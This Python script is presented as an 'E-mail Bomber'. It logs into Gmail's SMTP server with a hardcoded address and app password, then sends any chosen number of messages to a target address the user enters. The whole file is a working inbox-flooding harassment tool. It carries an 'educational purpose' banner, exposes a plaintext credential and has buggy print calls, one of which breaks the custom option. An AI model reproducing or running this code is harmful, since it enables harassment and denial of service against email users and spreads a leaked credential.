import smtplib 
import os 
import time 
import sys

def clear():
    os.system("clear")

def slow_header(text, delay):
    for i in text:
        sys.stdout.write(i)
        sys.stdout.flush()
        time.sleep(delay)

clear()

logo = """

\033[1;34m================================================

 \t\033[1;36m _____  _____ ________      _______  
 \t|  __ \\|_   _|___  /\\ \\    / /_   _| 
 \t| |__) | | |    / /  \\ \\  / /  | |   
 \t|  _  /  | |   / /    \\ \\/ /   | |   
 \t| | \\ \\ _| |_ / /__    \\  /   _| |_  
 \t|_|  \\_\\_____/_____|    \\/   |_____| 


       \033[1;32mAuthor   : Rizvi Ahmed
       Facebook : www.facebook.com/rijuorsiam 
       Github   : www.github.com/ahmedrizvisiam
       Group    : STLP TEAM

       Use the tool for Educational Purpose

\033[1;34m================================================\033[0m
"""

first_line = """\033[1;32m
------------------------------------------------
|                                              |
|             E-mail Bomber                    |
|                                              |
------------------------------------------------\n\n\033[0m"""

slow_header(logo, 0.02)
slow_header(first_line, 0.02)

# ✅ Connect to Gmail SMTP server
server = smtplib.SMTP("smtp.gmail.com", 587)
server.ehlo()
server.starttls()

# ⚠️ এখানে নিজের Gmail এবং App Password ব্যবহার করো
server.login("alvi88010@gmail.com", "pslddppaetorwmgu")

main_option = ("\t\033[1;33m1. Default Email Bomb\n\t2. Custom Email Bomb\n\t3. Exit\n\n\033[0m")
slow_header(main_option, 0.06)

choise = input("\n\n\tEnter your choice: ")

if choise == "1":
    to_mail = input("\n\n\tEnter Target Mail: ")
    msg = "Subject: Just For Fun!\n\nThis is a tool made by STLP TEAM's new Student."
    am = int(input("\n\tEnter Amount: "))

    for i in range(1, am+1):
        server.sendmail("alvi88010@gmail.com", to_mail, msg)
        slow_header("\n\t\033[1;32m{i} Email Sent Successfully ✅\n", 0.03)

elif choise == "2":
    to_mail = input("\n\n\tEnter Target Mail: ")
    cus = input("Enter your Text: ")
    msg = "Subject: TEAM STLP\n\n" + cus
    am = int(input("\n\tEnter Amount: "))

    for i in range(1, am+1):
        server.sendmail("alvi88010@gmail.com", to_mail, msg)
        slow_header(i,"\n\t\033[1;32m Email Sent Successfully ✅\n", 0.03)

elif choise == "3":
    print("\n\033[1;31mExiting... Goodbye!\033[0m")
    time.sleep(1)

else:
    print("\n\033[1;31mInvalid Choice!\033[0m")

server.quit()
